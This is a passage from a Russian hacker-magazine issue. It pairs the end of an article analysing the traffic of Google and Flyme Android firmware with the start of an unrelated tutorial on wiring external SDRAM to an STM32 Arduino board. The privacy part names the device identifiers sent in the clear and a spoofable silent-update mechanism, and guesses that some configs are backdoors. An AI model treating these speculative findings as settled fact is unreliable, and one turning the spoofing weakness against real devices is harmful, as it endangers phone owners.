  Уже спустя пять минут использования прошивка отправила в сеть 80 тысяч
пакетов, и я понял, что на ана лиз всего этого у меня уйдет вечность. Я просто
составлю список адресов, а ты решай сам, готов ли отправить неопределен‐
ное (а на самом деле вполне определен ное — 62 Мбайт) количество своих
данных в Google.


 IP-адрес       Хостнейм

  172.217.16.36      www.google.com

  216.58.209.3       connectivitycheck.gstatic.com

  216.239.35.12      time.android.com

  74.125.131.188     mtalk.google.com

  108.177.126.95     ns1.google.com

  74.125.143.94

  209.85.234.188

  108.177.119.147    ns1.google.com

  108.177.126.139    ns1.google.com

  108.177.126.94     ns1.google.com

  108.177.126.97     ns1.google.com

  108.177.127.95     ns1.google.com

  172.217.218.104

  172.217.218.91

  172.217.218.94

  172.217.218.95

  173.194.69.100

  173.194.69.190

  173.194.79.94

  173.194.79.95

  209.85.234.188

  216.239.35.12      time4.google.com

  216.58.209.3

  224.0.0.22         igmp.mcast.net

  224.0.0.251         sns.dns.icann.org

  23.222.51.182      a23‐222‐51‐182.deploy.static.akamaitechnologies.com

  74.125.128.188

  74.125.131.188

  74.125.143.94

  74.125.143.95

  86.57.206.210      210‐206‐57‐86.beltelecom.by

  8.8.8.8            google‐public‐dns‐a.google.com

  99.86.4.37          server‐99‐86‐4‐37.fra6.r.cloudfront.net

Лично у меня самое большое удивление вызвало обращение к поддомену
Бел телекома, к которому я прикреплен чуть менее чем никак. И еще интерес‐
нее, почему гугловская прошивка сту чит на Cloudfront.
  Возможно, тебя заинтересовало, почему я оставил пустые ячей ки в таб‐
лице, хотя адреса все нормально резолвятся. Я сделал это спе циально: все
они являются поддоменами 1e100.net, при надлежащими Google, и пред‐
назначены они только для сбора информации с обширного парка устройств
под управлением Android. Пус тыми я оставил эти ячейки, чтобы ты видел мас‐
штаб: 16 адресов *.1e100.net про тив 17 всех остальных. Да и нам сейчас
не важно, к какому именно штату принадлежит этот адрес (все они имеют
имена вида eg‐in‐f94.1e100.net, ec‐in‐f188.1e100.net), важен сам факт
соединения с этими адресами и передачи данных. Забегая вперед, скажу, что
ни одна прошивка из протестированных сегодня не стала использовать выс‐
тавленные настройки прокси. Вмес то этого бра узеры послушно ходили через
прокси, а все остальное так и шло безо вся кого досмотра содержимого
пакетов.
   HTTP‐запросов было всего семь. Из них три вернули код 204 (No Content),
остальные четыре скачали черные списки номеров, с которых рассылается
спам. Видимо, особо извес тные спа меры отфиль тровываются уже на уровне
прошивки.
   Итого из 33 хостов, куда ходил телефон без моего ведома, 28 принад‐
лежат Google, один — Amazon, а остальные — кому при дется. То есть абсо‐
лютное большинство данных берет себе Google.
  После всех этих интересностей я взял ся тыкать разные приложения. Почти
ни на какие новые для нас узлы трафик не шел (кроме 108.177.127.84). А спи‐
сок старых сократился почти в шесть раз: все еще держалось соединение
с         108.177.119.95,          108.177.126.147,          108.177.127.95,
173.194.69.100 и 173.194.79.95. В целом ничего странного.
  После отключения всего софта производс тва Google, кроме лаунчера (за
неимением альтернативы), результат налицо: единственное соединение
осталось с 108.177.127.95. Это сервер DNS‐over‐TCP.
  Вывод: за что боролись, на то и напоролись. Предус тановленные сервисы
и приложения Google повели себя ровно так, как описано в пользовательском
соглашении, — сливали статистику, обновляли данные и выполняли синхро‐
низацию. К сожалению (или счастью), при отклю чении или удалении сервисов
Google мы получаем обычный AOSP.


Flyme
Думаю, каждый читатель слышал про эту прошивку. Многие знают о плав‐
ности ее работы, приятном интерфейсе и, конечно же, о большой и вонючей
куче неудаляемых китайских сервисов. Еще на ста дии первого запус ка про‐
шивка просит нас принять обширное пользовательское соглашение. Я пос‐
тарал ся прочитать всего это го литера турного монстра (которого, кстати, я
нашел читабельным только на английском), чтобы ты, дорогой читатель,
не занимался тратой своего времени. Вкусности начинаются со второй трети
текста.





                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ

       ТИШЕ ВОДЫ,
       НИЖЕ ТРАВЫ
                  ЧТО И КАК СЛИВАЮТ ГУГЛОФОНЫ





После установки прошивки и сог лашения с этим монструозным списком тре‐
бований отдать неизвестно куда все свои данные кажется, что хуже уже быть
не может. Но нет! Спустя полчаса сидения за окошком сниффера мы перехо‐
дим ко второй части, когда начинаем тыкать приложения. Весь пре дустанов‐
ленный софт за исключением диктофона потребовал разрешить пользовать‐
ся интернетом под разными предлогами, а половина из них еще и просила
доступ к контактам. Даже клавиатура отка залась работать без выдачи этих
разрешений. Для нее пришлось сделать исклю чение, так как без статичес‐
кого адреса мы не смогли бы исследовать трафик по причине его отсутствия.





Прошивка сде лала DNS‐запросы к следующим хос там:
 • connect.rom.miui.com;
 • ni.qingmang.mobi;
 • api‐baas.ﬂyme.cn;
 • uxip‐res.meizu.com;
 • umap.meizu.com;
 • u.meizu.com;
 • servicecut.meizu.com;
 • input.shouji.sogou.com;
 • uc‐res.mzres.com;
 • api‐push.meizu.com;
 • ﬁndphone.meizu.com;
 • upush.meizu.com;
 • safe.res.meizu.com;
 • safe.meizu.com;
 • apilocate.amap.com;
 • uxip‐conﬁg.meizu.com;
 • safe.mzres.com;
 • pmir.3g.qq.com;
 • www.baidu.com;
 • umid.orion.meizu.com;
 • p.meizu.com;
 • apiinit.amap.com;
 • scan.call.f.360.cn;
 • uxip.meizu.com;
 • mazu.3g.qq.com;
 • restapi.amap.com;
 • p‐ns.meizu.com;
 • map‐api.cn‐hangzhou.oss‐pub.aliyun‐inc.com;
 • hades.meizu.com;
 • stats.lineageos.org;
 • aider.meizu.com;
 • roam.meizu.com;
 • aider‐res.meizu.com;
 • g.meizu.com.

В этот список не попали адреса Google, такие как адрес NTP‐сервера и con‐
nectivitycheck.gstatic.com, но это не имеет зна чения в данный момент.
Среди остальных адресов мы можем видеть findphone.meizu.com, который,
очевидно, отвечает за службу поиска телефона. И никого не вол нует, что она
не включена на телефо не. Зап рос‐то ушел, хоть пока и только по DNS. Сле‐
дующий  очень  интересный  адрес —  apilocate.amap.com,  который,
как понятно из названия, хочет узнать мес тоположение. Но давай‐ка мы
не будем делать преждевременных выводов, а лучше глянем, что же ушло
по HTTP.


HTTP
Первый же HTTP‐запрос ушел на u.meizu.com и отправил POST’ом сле‐
дующую информацию:
 • deviceType (имя и модель устройства. У меня — «Redmi‐Note4x»);
 • версия Firmware;
 • версия прошив ки;
 • IMEI устройства (!);
 • ID и серийный номер устройства;
 • имя сервиса, отправившего информацию (в этом случае — com.meizu.
  battery) и его версия.

Обращаю твое внимание, что данные подписаны, а это значит, что ты не смо‐
жешь просто взять и вырезать их через прокси. Эти данные потенциально
позволяют производителю определить, исполь зуешь ли ты смартфон Meizu
или установил прошив ку на сто ронний девайс.





Следующим пакетом на тот же адрес (u.meizu.com) уходит точно такой же
отчет, но доносчиком зна чится уже фир менный лаунчер (com.meizu.flyme.
launcher). Показательно, что эти данные отправляются будто бы в службу
обновления фирменных сервисов, только мне, нап ример, не совсем понятно,
зачем IMEI, ID и серийный номер устройства нужны при обновлении. Но,
как говорится, жираф большой, ему видней.
  И действительно, в ответ на этот запрос приходит JSON, поля которого
вполне подходят под заявленную цель. Среди полей есть название приложе‐
ния (на китайском, несмотря на выставлен ную при первой настройке англий‐
скую локализацию), имя пакета, тип обновления (обя зательное или нет), пос‐
ледняя доступная на сервере вер сия, время ее выпус ка и release notes к ней,
URL обновления, размер и хеш загружаемого файла, условия обновления
и флаг тихой установки. Ты, конечно, спросишь, а что же тут не так? А не так
вот что: этот запрос идет по чистому HTTP безо вся ких вам SSL/TLS, что соз‐
дает благоприятные усло вия для подмены такого тра фика. И если учесть то,
что обновление может быть установлено незамедлительно (флаг needsUp‐
date) и в тихом режиме (флаг silentUpgrade), а для проверки целостности
используется только раз мер файла и его хеш, устройства с Flyme на борту
очень легко могут стать мишеня ми ботнетов. Более того, твои личные дан‐
ные, в том числе IMEI, ID устройства и его серийный номер, могут быть легко
украдены при усло вии нахождения с тобой в одной сети.
  Далее система получа ет список активити приложе ний, которым по умол‐
чанию не нужно спрашивать раз решение на рисование поверх экрана бло‐
кировки. По умолчанию это экран стандартного лаунчера и некий com.ten‐
cent.mobileqq.activity.QQLSActivity. С этим именем пакета (com.ten‐
cent.mobileqq) в Play Market’е размещен довольно популярный мессенджер
Tencent QQ, проч но засевший в списках антивирус ных продуктов как adware.
   Дальше идет обрывок ответа на запрос, принадлежность которого Wire‐
shark не смог опознать. Как, впрочем, не поймал и его начало. Там был JSON
следующего содержания:


{
  "apkName":"com.DBGame.DiabloLOL",
  "category2Id":1004,
  "category2Name":"å¨ä½åé©",
  "categoryId":2,
  "categoryName":"æ¸¸æä¸åº",
  "cnName":"ç«æ´äººèç",
  "createTime":1484690841000,
  "devName":"äºç±äºå¨ç§æ",
  "id":185417,
  "installCount":1028899,
  "stars":113710,
  "tagName":"æ¨ªç,æ ¼æ"
},{
  "apkName":"com.m37.yhjyj.mz",
  "category2Id":1001,
  "category2Name":"è§è²æ®æ¼",
  "categoryId":2,
  "categoryName":"æ¸¸æä¸åº",
  "cnName":"æ°¸æçºªåh",
  "createTime":1484690855000,
  "devName":"ç¨æ∙494550072",
  "id":795971,
  "installCount":1015194,
  "stars":58590,
  "tagName":"å³æ¶,å¤§ä½,éå¹»,ç»åh¸"
},{
  "apkName":"com.netease.my.mz",
  "category2Id":9025,
  "category2Name":"åh¶ä»æ¸¸æ",
  "categoryId":2,
  "categoryName":"æ¸¸æä¸åº",
  "cnName":"æ¢¦å¹»è¥¿æ¸¸",
  "createTime":1484690857000,
  "devName":"Netease_Game",
  "id":910997,
  "installCount":986444,
  "stars":601440,
  "tagName":"çhé,ä»ä¾,Qç,å¤§ä½,ç»åh¸"
},{
  "apkName":"wb.gc.xmxx.zxb",
  "category2Id":1000,
  "category2Name":"ä¼é²çæº",
  "categoryId":2,
  "categoryName":"æ¸¸æä¸åº",
  "cnNam





Налицо перечисление приложений (поле apkName, несомненно, содержит
имя пакета целевого приложения) с ука зани ем его категории (видимо,
это дол жны были быть китайские иерог лифы, но ASCII не отображает их пра‐
вильно), вре мени создания, ID в какой‐то внутренней системе, количества
установок и, предположитель но, рейтинга (поле stars). Адрес отправителя
(183.61.122.111) наш любимый Google Public DNS опознал как soa.dns.
guangzhou.gd.cn. К сожалению, на этом наш интересный пакет оборвался,
но на некоторые мысли он однозначно наводит. Реклама? Скрытая установка
адвари? Имена пакетов выглядят нечело векочитаемыми, так что наз начение
этих программ остается неизвестным. И, что неудивительно, ни одной из них
нет в Google Play.
  Затем проснулся агент геоло кации (на это указывает заголовок User‐
Agent: AMAP_Location_SDK_Android 2.4.0), который отправил 261 байт
бинарных данных на apilocate.amap.com/mobile/binary.
  Я уже думал прекращать просматривать однотипные пакеты, в которых
уходила моя драгоценная информация, но вдруг наткнул ся на один пакет,
непохожий на остальные. Его содержимое:


PLQ?çØ^E,³R@,jôq`²#
P«ÿëGÏË¿>é
KÙÌmeizu.com/pack/ramcleaner/whitelist/update.db_1560182405.zip",
"ver":1560182405},
{"type":"patch","url":"http://safe.res.meizu.com/pack/ramcleaner/
whitelist/update.db_1560268805.zip","ver":1560268805}]},
"appinfo":{"packs":[{"type":"full","url":"http://safe.res.meizu.com/
pack/app/appinfo.db_1560268805_full.zip","ver":1560268805}]},
"harassmentBlocking":{"packs":[{"type":"full","url":"http://safe.res.
meizu.com/pack/harassmentblocking/update.db_1560268805_full.zip",
"ver":1560268805}]},
"qrcodeUrl":{"packs":[{"type":"full","url":"http://safe.res.meizu.
com/pack/qrcodeurl/qrcodeurl.db_1560268805_full.zip","ver":156026
8805}]},
"trashclean":{"packs":[{"type":"full","url":"http://safe.res.meizu.
com/pack/trash/trashclean.db_1560268805_full.zip","ver":1560268805}]}
}

Пройдемся по этим архивам по порядку:
 • update.db_1560182405.zip содержит единственный файл update.db .
  В нем перечислены сервисы Meizu с одним значением из двух (1 или 2).
  К сожалению, это оказалась не нормальная БД, а простой текст, так что
   у меня даже нет названий этих столбцов. Но если внимательно прочитать
   URL, по которому ска чивается этот файл, то можно увидеть строку ram
  cleaner, указывающую, что этот файл лишь конфиг для встроенного
   таск‐киллера. Значит, цифры, скорее всего, озна чают приори теты процес‐
   сов;
 • appinfo.db_1560268805_full.zip — JSON‐файл, по структуре подоз‐
   рительно похожий на тот безымянный кусок, что мы рассматривали парой
   абзацев выше. Ничего нового тут не ока залось;
 • update.db_1560268805_full.zip — спи сок из 18 номеров спаеров (ha‐
   rassment blocking, упомянутый в URL, переводится как «предотвращение
   беспокойства»). Все номера  китайские. Это  все,  что  нужно  знать
  об эффективности защиты, если даже на стра ну с населе нием 1,4 мил‐
   лиарда человек есть список только из 18 спа меров;
 • qrcodeurl.db_1560268805_full.zip — девять строк JSON’а, содер‐
  жащие вредоносные адреса, которые, как понятно из URL, распростра‐
   няют через QR‐коды.

И в последнем архиве trashclean.db_1560268805_full.zip, как становится
ясно из того же источника, содержатся парамет ры очистки мусора в памяти
устройства. Этот конфиг поз воляет не потерять «кри тически важные» данные
сервисов, названия которых явно выдают их принадлежность  к  Meizu.
В общем, почти ничего криминального.


        WWW

                   Я скачал эти архивы и сделал их копию на Mega
                       на случай проблем с доступом по указанным
                      ссылкам.


Спустя пару минут телефон ска чал архив с JSON, содержащий весьма
обширный (более 1700 строк) список раз решений для этих приложений
и комментарии к ним на китайском. Сам архив можно взять по ссылке выше,
он называется newupdate.db_1560268805_full.zip.
  Внезапно пришел увесистый пакет (22,5 Кбайт), содержащий JSON‐кон‐
фиг для какого‐то приложения. По всей видимости, этот конфиг содержит
список программ и активити, действия с которыми нужно перехватывать.
  Сразу скажу, что я сна чала соб рал дампы трафика всех прошивок и только
потом анализировал их, поэтому, ког да такая засада обнаружилась, я уже
не имел возможности выяснить что‐либо конкрет нее. Исходя из содержимого
пакетов, я выдвинул две версии, что это может быть.
  Первая версия: перед нами конфиг бэкдора, и вот почему я так решил.
 1. URL   (safe.meizu.com/service/corrstartapp/getrule)  как  бы
   намекает, что оттуда прилетят какие‐то пра вила или фильтры.
 2. Названия полей в этом JSON’е слишком уж похожи на поля конфига рат‐
   ника. Пример:


   {"1":"runType===activity|||callerPkg===*|||calleePkg===*|||callee
   Class===com.igexin.sdk.GActivity|||proces
   sName===*|||action===*|||data===*|||extras===*|||interc
   eption===true"}

Версия вторая: это что‐то вроде базы для антивируса или блокировщика
назойливой рекламы. Она более подкреп лена доказа тельствами, так как упо‐
мянутый com.igexin.sdk.GActivity принадлежит к давно известному ad‐
ware SDK. Судя по всему, встро енный анти вирус перехватывает, а затем бло‐
кирует вызовы этого SDK.
  Далее  телефон  пытается  загрузить  libJni_wgs2gcj.so  (снова  же
по обычному HTTP) с amap‐api.cn‐hangzhou.oss‐pub.aliyun‐inc.com/
sdkcoor/android/arm64‐v8a/libJni_wgs2gcj.so. Я не мастер реверса
бинарников, но я посмотрел hex‐дамп этого файла и увидел интересные
строки, указывающие на обфускацию. Но зачем не столь уж секретной биб‐
лиотеке обфускация? А может, ее содержимое не совсем соответс твует наз‐
ванию? Есть только один способ выяснить ее реаль ную функци ональность:
погуглить. :) Гугление выда ет информацию, что это чистой воды троян, при‐
чем попал он в антивирус ные базы еще в далеком августе 2017 года.





                      Об фуска ция?

И чтобы ты не радовался, что хоть какие‐то данные еще остались у тебя, вот
последний логический гвоздь в крыш ку гро ба тво ей надежды:


{
  "priority_directory": [
    "DingTalk",
    "tencent/MobileQQ/shortvideo",
    "tencent/MicroMsg/WeiXin",
    "tencent/MicroMsg/Download",
    "Pictures/Screenshots",
    "Download",
    "Movies/Screenrecords",
    "iqiyi",
    "iqiyi_live",
    "iqiyi_p2p",
    "UCDownloads",
    "kugou",
    "kugoumusic",
    "kgmusic",
    "QQLive",
    "qqmusic",
    "Sina/weibo/weibo",
    "Sina/weibo/weibo_filter",
    "DCIM"
  ]
}

Да, это список папок в твоей внутренней памяти. Помаши ручкой улетающей
приватности, ведь теперь все твои данные, вклю чая фотки и видео с котика‐
ми, доступны неограниченному кру гу лиц, которые даже знают все возможные
места, где это искать.
  Думаю, при дальнейшем рас смот рении этой прошивки мы не увидим
ничего инте реснее, чем уже увидели до этого. Предлагаю перейти сразу
к анализу трафика прошивки после судорожных попыток хоть что‐нибудь
отключить.


После мак симальной очистки
После очистки, то есть отключения всех фирменных приложе ний Meizu и при‐
нудительного убийства всех сервисов, пакетов ста ло на порядок меньше:
477 против 7661. Появился новый хост  (log.avlyun.com), на который
телефон передал 4,2 Кбайт данных по TLS. В HTTP‐трафике почти чисто,
проснулся только калькулятор  (com.meizu.flyme.calculator) и отправил
статистику. Возможно, это связано с тем, что за прошедший перед этим час
прошивка уже успела отпра вить все, что хотела, и сей час решила зас луженно
отдохнуть.
  Мой вердикт лучше всего опишет белорусская фраза «Не чапай, бо ляс‐
не». Просто не трогай эту прошивку, и тебя минует участь подопытного кро‐
лика, за которым день и ночь пристально следят страшные дяди и тети. Видя,
что передается в открытую, я никак не могу наз вать этого шпиона прошивкой
для настоящего хакера.


ВЫВОДЫ
Сегодня мы затронули только верхушку айсберга кастомных прошивок.
Естественно, я выбрал для этого обзора только самых вкусных представите‐
лей этого большого семейства, но, как ты понял, если прошивку разрабаты‐
вает вендор (а в особенности — китайский), то про собственную приватность
можешь забыть. Мой выбор — LineageOS, и я вся чески тебе его советую
в качестве достойной альтернативы MIUI и Flyme.
ТРЮКИ

 МЕЙКЕРСТВО
 НА МАКСИМАЛКАХ





       ЗАВОДИМ И РАЗГОНЯЕМ
       ОПЕРАТИВНУЮ ПАМЯТЬ
         НА STM32 И ARDUINO





Ты помигал светодиодиком, собрал мете‐
останцию и робота на радиоуп равлении,
а  потом  успел  разочароваться  в  этих
маленьких кусочках кремния, что зовутся
микроконтроллерами? Напрасно! Сегодня               faberge                                                                             Цифровыхъ дѣлъ мастеръ
я  покажу,  как  научить  Arduino работать            shirous@yandex.ru
с внешней памятью и выжать из нее мак‐
симум для твоих проектов.


Сердцем мира Arduino всегда был и оста ется крохотный микроконтроллер AT‐
mega328P. Однако сегодня его скромные характеристики (16 МГц, 2 Кбайт
ОЗУ и 32 Кбайт ПЗУ) и уста ревшая вось мибит ная архи тектура AVR уже ста‐
новятся препятствием при работе с аудио, графикой и сетью. К счастью,
за эти годы вокруг Arduino успело сложиться огромное сообщество любите‐
лей и разработчиков. Общими усилиями в проект была добавлена поддержка
самых разных микроконтроллеров, в том числе очень популярное семей ство
STM32.
  Их основой служит 32‐разрядное процессорное ядро компании ARM.
Параметры конкретной микросхемы зависят от модельной линейки (Value
Line, Mainstream, Performance), но даже самые слабые модели уверенно
обгоняют ATmega AVR в дос тупных возможностях и производительности. Если
добавить сюда богатую периферию, многочисленные интерфейсы для связи
с внешним миром и разумную цену, то совсем неудивительно, что эти мик‐
роконтроллеры полюбились сооб щес тву и получи ли широкое распростра‐
нение.


             INFO

                   В компании ARM инженеры не лишены чувства
                  юмора. Сегодня существуют три семейства про‐
                      цессорных ядер для встраиваемых систем — Cor‐
                          tex‐A (application), Cortex‐R (real‐time) и Cortex‐M
                             (microcontroller). Индексы в наз ваниях образуют
                     имя архитектуры — ARM. Знакомые буквы мож но
                      найти и  в  сокращенном  названии  основного
                       справочного докумен та — ARM Architecture Refer‐
                       ence Manual (PDF). Такие вот шуточки для тех, кто
                        в теме.


В предыдущих статьях («Как реализовать шифрование для самодельного гад‐
жета», «Ищем энтропию на микросхеме, чтобы повысить стойкость шифров»)
я использовал плату Discovery с микрокон троллером F746NG. Это очень мощ‐
ное решение на основе Cortex‐M7, с час тотой в 216 МГц, 320 Кбайт опе‐
ративной памяти и мегабайтом флеша. Но что делать, если вдруг и этого
мало? К примеру, если попытать ся работать с размещенным на этой же плате
дисплеем с разрешени ем 480 на 272 пикселя, то при глу бине цве та в 32 бита
нам потребуется как минимум 510 Кбайт памяти, что бы хранить буфер кадра.
   Если  при  отрисовке  дополнитель но  использовать  буферизацию
и рисовать в теневой кадр, пока предыду щий отображается на дисплее, то
это значение нужно удвоить. Получившийся мегабайт, нужный для одной
только графики, в оперативную память нашего микроконтрол лера решитель‐
но не лезет. Что же делать?
  К счастью, у F746NG есть периферийный блок FMC (Flexible Memory Con‐
trol) для работы с интерфейсами внешней памяти. А на самой плате уже рас‐
паяна микросхе ма SDRAM на 128 Мбит (не байт!). Но почему‐то при пор‐
тировании в Arduino IDE авторы STM32duino не захоте ли добавлять ее под‐
держку в файлах для платы Discovery. Если сделать все грамотно и аккуратно,
то пос ле инициализации аппаратного уровня для нашей программы не будет
никакой разницы, работать ли с внутренней памятью или с внешней. Я счи‐
таю, надо попробовать!


             INFO

                     Сейчас порой кажется, что в эпоху AVR микрокон‐
                        троллеры обладали только стандартным набором
                     периферии и ничего сложного подцепить к ним
                     было нельзя. Однако это не так — к некоторым
                       из них тоже можно было подключить внешнюю
                       память через интерфейс XMEM и отобразить ее
                        в адресное пространство ЦПУ. Например, на МК
                      ATmega8515  можно  было   увеличить  ОЗУ
                       со скромных 512 байт до внушительных 64 Кбайт!
                         Тогда это, конечно, поражало воображение.



ПОДГОТОВКА
Итак, нашей главной целью будет размещение 8 Мбайт оперативной памяти
в адресном пространстве процес сора Cortex‐M7. Да, я не ошибся — хоть
у нас и 128 Мбит (16 Мбайт) во внеш ней микросхеме, но из‐за того, что
на плате разведена 16‐битная шина данных (вместо максимально воз‐
можных 32 бит), нам по факту дос тупна только половина этого объема. Это,
конечно, неприятно, но тут уж ничего не поделать.
  Начинать следует с поис ка документации и знакомства с ней. Для удобс‐
тва я уже собрал все необходимое в снос ке ниже. На первый взгляд там
в руководствах сотни стра ниц и осилить их едва ли возможно, но на практике
это вовсе и не требуется. Про верить адрес и описание регистров в одном
месте, подсмотреть тайминги в дру гом, прочитать пару абзацев в третьем —
вот, собственно, и все.


        WWW

                   •Документация на мик рокон троллер DS10916
                   •Документация на мик росхему памяти SDRAM
                   •Документация на плату UM1907
                     •Референс на мик рокон троллер RM0385


Посмотрим, как выглядит адресное прос транство на нашем микроконтрол‐
лере. Это восемь блоков по 512 Мбайт (итого 4 Гбайт — максимум для 32‐
разрядных процессоров). Системное ОЗУ рас полагается в первом блоке
и занимает адре са с 0x20000000 по 0x2004FFFF, предоставляя в наше рас‐
поряжение 320 Кбайт ста тичес кой памяти. Больше можно получить только
с помощью FMC и внешней микросхемы. FMC работа ет с адре сами из блоков
с третьего по шестой, но подключить SDRAM можно только в два последних.
  Я предлагаю разместить внешнюю память в пятом блоке. Так мы получим
дополнительные 8 Мбайт по адресам с 0xC0000000 по 0xC07FFFFF. Перифе‐
рийный блок FMC будет обра батывать все зап росы на доступ к памяти в этой
области и по параллель ной шине переправлять в микросхему SDRAM.
В целом такое взаимодействие меж ду ЦПУ и внешним ОЗУ мало чем отли‐
чается от работы с памятью на любом компь ютере, смартфоне или ноутбуке.
Да, там все это гораздо быс трее и объемы сущес твенно больше, но прин‐
ципиальных отличий немного.
  По существу, от нас требует ся выполнить функции BIOS по инициализации
аппаратной части и сделать ровно три вещи. Во‐первых, сконфигурировать
выводы микроконтроллера  для  работы  с  параллельным интерфейсом.
Во‐вторых, настро ить FMC под нашу оперативную память (да, придется поиг‐
раться с таймингами). В‐третьих, загрузить регистр с параметрами работы
в саму микросхе му. В итоге наша основная функция будет выглядеть как‐то
так:


void xmem_init() {
  pin_init();
  fmc_init();
  sdram_init();
}

Осталось только последова тельно написать реализацию для каждого этапа
и органично вставить это куда‐нибудь в код скетча.


ИНТЕРФЕЙС ПАМЯТИ
Прежде всего нужно определить ся с физичес ким представлением нашего
интерфейса памяти. У нас есть отдельные сигналь ные линии для адресов
(A[25:0]), данных (D[31:0]), команд (CAS, RAS, WE, CS) и тактирования (CLK,
CKE). Дело несколь ко облегча ется тем, что используется далеко не пол ный
набор (про урезанную шину данных я уже упоминал), но и всего этого немало.
   Схему подклю чения SDRAM к микроконтроллеру можно найти в докумен‐
тации на плату. Там же можно узнать, что для адресации используются 12 бит
и еще два дополнительных бита ука зывают на один из четырех внутренних
банков памяти в микросхеме. Для наглядности я свел все данные в неболь‐
шую табличку.





Теперь остается толь ко сконфигурировать все выводы GPIO для работы
в альтернативном режиме с FMC.


#include "stm32f746xx.h" /* for CMSIS defines */


static inline void pin_init() {
  /* Enable clock for GPIO ports */
  RCC ‐> AHB1ENR |= RCC_AHB1ENR_GPIOCEN | RCC_AHB1ENR_GPIODEN |
                    RCC_AHB1ENR_GPIOEEN | RCC_AHB1ENR_GPIOFEN |
                    RCC_AHB1ENR_GPIOGEN | RCC_AHB1ENR_GPIOHEN;


  /* Configure GPIO ports */
  /* PC3: AF PP + VHS + AF12 */
  GPIOC ‐> MODER   |= GPIO_MODER_MODER3_1;
  GPIOC ‐> OSPEEDR |= GPIO_OSPEEDER_OSPEEDR3_1 | GPIO_OSPEEDER_O
SPEEDR3_0;
  GPIOC ‐> AFR[0]  |= GPIO_AFRL_AFRL3_3 | GPIO_AFRL_AFRL3_2;
  ...
}

Здесь мы последовательно пода ем тактирование на порты GPIO (без этого
никак), затем для PC3 зада ем режим работы, уста навливаем максимальную
скорость и выбираем его в качестве вывода FMC. Остается только повторить
операции выше для всех остальных сигналов.
   Это самая нудная и примитивная часть всего процесса. Хуже того, оши‐
баться тут никак нельзя, поскольку заметить опечатку потом будет очень
сложно. Так что я выделил код для всех оставшихся выводов в отдельном лис‐
тинге.


НАСТРОЙКА FMC
Следующим этапом нужно сконфигурировать блок FMC для нашей микросхе‐
мы памяти. Большую часть нужных параметров мож но почерпнуть из даташи‐
та, но самое глав ное решение предстоит принимать самостоятельно. Конеч‐
но же, я говорю о тактовой час тоте оперативной памяти. Именно она будет
определять все остальные тайминги, и именно от нее будет зависеть ито‐
говая производительность нашей системы.
  По умолчанию FMC  тактиру ется  от  час тоты процессора — HCLK.
Для F746NG максимальное зна чение сос тавляет 216 МГц, и базовая настрой‐
ка в скетче Arduino (до вызовов функций setup и loop) выс тавляет именно
его. Конечно же, выбрать такую частоту для микросхемы памяти было бы
слишком, ведь по документации она работает толь ко вплоть до 167 МГц.
  Поэтому блок FMC позволяет выбрать предделитель для час тоты SDRAM.
На выбор дается только два значения: /2 и /3. И это крайне неприятно, так
как у нас есть дополнительное огра ничение на максимальную частоту самого
FMC и больше 100 МГц на нем выставлять вроде как нельзя. Но очень хочет‐
ся!





Что же делать — снижать частоту ядра до 200 МГц или выбирать делитель /3
и довольствоваться скромными 72 МГц на оперативной памяти? Конечно же,
это все неправильные варианты. Надо раз гонять, и разгонять по максимуму!
Окей, звучит несколько самоуверенно, но на самом деле у нас очень хорошие
шансы на успех, и я постара юсь кратко объяснить почему.
  Работа любой микросхемы гарантиру ется ее производите лем только
в определенном диапазоне температур и напряжения  питания  (такую
информацию всегда мож но найти в даташите). Ключевое слово здесь —
«гарантируется». Эти цифры — не уловки пиарщиков и маркетологов и эфе‐
мерные «+200% эффективности и скорос ти», которые замерили в иде альных
условиях, а по факту в реальной жизни никто не увидит.
   Нет, тут все серьезно. Перед тем как запустить микросхему в продажу,
производитель проводит все необ ходимые тес ты у себя в лабораториях,
а  главный инженер  рас писывается  под  результатами  кровью. Ладно,
про кровь я пошутил, но идею ты наверняка понял.
   У нас же поч ти «тепличные» усло вия использования для микросхемы —
комнатная температура и ста бильное напряжение на уровне 3,3 В. Как раз
ровно посередине рекомендуемого диапазона 3,0–3,6 В. Так что все будет
уверенно работать и на 108 МГц, еще и тайминги можно будет занизить.
   Кстати, о таймингах. Теперь, ког да известна тактовая частота, можно под‐
считать длительность периода. Это примерно 9 нс, большая точность нам
не требуется (несмотря на то что в секундах это цифра крохотная и в ней при‐
лично нулей после запятой). И да, обрати внимание, у нас SDR (Single Data
Rate) память, а не более привычная по миру персональных компьюте ров DDR
(Double Data  Rate). Это зна чит,  что син хро низация происходит только
по одному фрон ту тактового сигнала вмес то двух. Грубо говоря, в два раза
медленнее при той же час тоте.
   Зная длительность пери ода, теперь легко вычислить величину всех нужных
таймингов (для этого посмотри таб лицы 12 и 13 в даташи те на микросхему
памяти). Там, где их значение указывается в наносекундах, нужно подобрать
такое количество тактов, чтобы их суммарная длительность была бы больше.
Как пример — значение TXSR в таблице составляет 70 нс, а значит, надо ука‐
зывать для него задержку в восемь тактов (8 х 9 = 72 > 70).
  В общем, это не самая простая часть всей нас тройки, но в коде все выг‐
лядит вполне компактно (всего три записи в регистры).


static inline void fmc_init() {
  /* Enable clock for FMC */
  RCC ‐> AHB3ENR |= RCC_AHB3ENR_FMCEN;


  /* Configure Control Register:
   * 1. Use FIFO for Burst reads
   * 2. SDCLK is HCLK / 2 (108 MHz)
   * 3. CAS latency is 2 clock cycles
   * 4. Four internal banks
   * 5. Data bus width is 16 bits
   * 6. 4096 rows (12 bits)
   * 7. 256 columns (8 bits)
   */
  FMC_Bank5_6 ‐> SDCR[0]  = FMC_SDCR1_RBURST | FMC_SDCR1_SDCLK_1 |
                            FMC_SDCR1_CAS_1 | FMC_SDCR1_NB |
                            FMC_SDCR1_MWID_0 | FMC_SDCR1_NR_0;


  /* Configure Timing register:
   * 1. TRCD = 2 CLK cycles
   * 2. TRP = 2 CLK cycles
   * 3. TWR = 2 CLK cycles
   * 4. TRC = 7 CLK cycles
   * 5. TRAS = 5 CLK cycles
   * 6. TXSR = 8 CLK cycles
   * 7. TMRD = 2 CLK cycles
   */
  FMC_Bank5_6 ‐> SDTR[0]  = FMC_SDTR1_TRCD_0 | FMC_SDTR1_TRP_0 |
                            FMC_SDTR1_TWR_0 | FMC_SDTR1_TRC_2 |
                            FMC_SDTR1_TRC_1 | FMC_SDTR1_TRAS_2 |
                            FMC_SDTR1_TXSR_2 | FMC_SDTR1_TXSR_1 |
                            FMC_SDTR1_TXSR_0 | FMC_SDTR1_TMRD_0;
}




                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
       МЕЙКЕРСТВО
